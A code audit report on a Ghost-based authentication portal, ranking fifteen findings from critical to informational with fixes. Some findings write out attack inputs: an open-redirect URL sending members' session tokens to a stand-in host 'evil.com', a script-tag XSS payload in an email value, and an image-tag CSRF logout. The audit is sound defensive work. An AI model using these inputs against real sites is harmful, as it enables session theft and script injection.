# Code Audit — Ghost Auth Portal

Audited: all Python, HTML, and JS source files.
Date: 2026-02-15

Severity scale: **CRITICAL** > **HIGH** > **MEDIUM** > **LOW** > **INFO**

---

## CRITICAL

### 1. Open redirect + token theft in Ghost gate script

**Files:** `ghost-app-login.html` (line 82), `static/ghost.js` (line 56)

The `r` query parameter is used unvalidated as the redirect target. An attacker can craft:

```
https://www.technodabbler.com/app-login/?r=https://evil.com/steal
```

If the victim is a logged-in Ghost member, `ghost.js` fetches their session JWT and redirects to `evil.com#token=<jwt>`, leaking the token to the attacker.

**Fix:** Validate `returnTarget` against an allowlist of permitted origins or at minimum check that the hostname matches a configured app domain before redirecting.

---

## HIGH

### 2. XSS via unescaped session value in index route

**File:** `app.py` (line 36)

```python
return f"Hello, {session['ghost_sub']}"
```

`ghost_sub` (the member email) is injected directly into an HTML response without escaping. Flask defaults to `text/html`. A crafted email like `<script>alert(1)</script>@example.com` would execute in the browser.

**Fix:** Use `markupsafe.escape()` or return via a Jinja2 template.

### 3. Logout via GET is CSRF-vulnerable

**File:** `ghost_auth_bridge/flask_integration.py` (line 68)

```python
@bp.get("/logout")
```

Any page can log a user out with `<img src="https://app/logout">`. This enables CSRF logout attacks.

**Fix:** Change to POST with a CSRF-safe form, or at minimum add a confirmation page.

---

## MEDIUM

### 4. Flask sessions never expire

**File:** `app.py`

No `PERMANENT_SESSION_LIFETIME` is configured and `session.permanent` is never set to `True`. Sessions persist indefinitely until the browser closes. A stolen session cookie has no server-enforced TTL.

**Fix:** Set `PERMANENT_SESSION_LIFETIME` (e.g., 24 hours), set `session.permanent = True` after login.

### 5. No auth event logging

**Files:** `ghost_auth_bridge/flask_integration.py`, `ghost_auth_bridge/verifier.py`

Auth successes, failures, invalid state attempts, and token errors are not logged. Production debugging and security incident detection are blind.

**Fix:** Add structured logging for all auth events (success with `sub`, failures with error type). Never log raw tokens.

### 6. JWKS fetch errors become raw 500s

**File:** `ghost_auth_bridge/jwks.py`

If Ghost is temporarily unreachable, `requests.get()` raises `ConnectionError` or `Timeout` which propagates as an unhandled 500 to the user.

**Fix:** Catch `requests.RequestException` in the verification path and return a user-friendly 503 or retry response.

### 7. No Content-Security-Policy headers

**Files:** `app.py`, `templates/callback.html`

No CSP headers are set on any response. This increases the blast radius of any XSS vulnerability.

**Fix:** Add a restrictive CSP header, at minimum: `default-src 'self'; script-src 'self'`. The callback page uses inline script, so add a nonce or hash.

---

## LOW

### 8. JWKS cache is not thread-safe

**File:** `ghost_auth_bridge/jwks.py`

Under gunicorn threaded workers, two threads can race on `get_jwks()` and both fetch JWKS simultaneously. Not a correctness bug (both get valid keys), but wastes a network call.

**Fix:** Add a `threading.Lock` around the cache read/write.

### 9. `SESSION_COOKIE_SAMESITE` accepts arbitrary input

**File:** `app.py` (line 21)

```python
session_cookie_samesite = os.getenv("SESSION_COOKIE_SAMESITE", "Lax")
```

No validation. An invalid value like `"banana"` is silently passed to Flask.

**Fix:** Validate against `{"Strict", "Lax", "None"}`.

### 10. `JWKS_CACHE_TTL_SECONDS` parsed without error handling

**File:** `ghost_auth_bridge/config.py` (line 53)

```python
jwks_cache_ttl_seconds=int(os.getenv("JWKS_CACHE_TTL_SECONDS", "300")),
```

A non-numeric env value crashes with an unhelpful `ValueError`.

**Fix:** Wrap in try/except with a clear error message.

### 11. `static/ghost.js` and `ghost-app-login.html` can drift

Two copies of the same gate logic exist. Edits to one are easily missed in the other.

**Fix:** Pick one as canonical. Either always serve from `static/ghost.js` and load it in the HTML via `<script src>`, or inline it entirely in `ghost-app-login.html` and delete `static/ghost.js`.

### 12. No test suite

No tests exist for token verification, state validation, redirect logic, or JWKS caching.

**Fix:** Add pytest tests with mocked JWKS + JWT fixtures. Priority targets: `verifier.verify()`, state round-trip, open redirect guard, logout.

---

## INFO

### 13. Unnecessary `json.dumps` in verifier

**File:** `ghost_auth_bridge/verifier.py` (line 43)

```python
public_key = RSAAlgorithm.from_jwk(json.dumps(jwk))
```

PyJWT 2.x `from_jwk()` accepts a dict directly. The extra serialization works but is unnecessary.

### 14. `ghost-app-login.html` has hardcoded test URL

**File:** `ghost-app-login.html` (line 13)

```javascript
callbackUrl: "https://test.technodabbler.com/auth/ghost/callback",
```

Anyone copying this template must remember to change it. Add a prominent `<!-- CHANGE THIS -->` comment.

### 15. `quote` unused import after refactor

**File:** `ghost_auth_bridge/flask_integration.py` (line 5)

`quote` is still imported and used in the gate URL construction, so it's not technically unused — but `urlencode` handles the callback portion now. Review whether `quote` is still needed or if the entire URL can be built with `urlencode`.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 1     |
| HIGH     | 2     |
| MEDIUM   | 4     |
| LOW      | 5     |
| INFO     | 3     |

**Top priority:** Fix #1 (open redirect / token theft) before any production deployment.
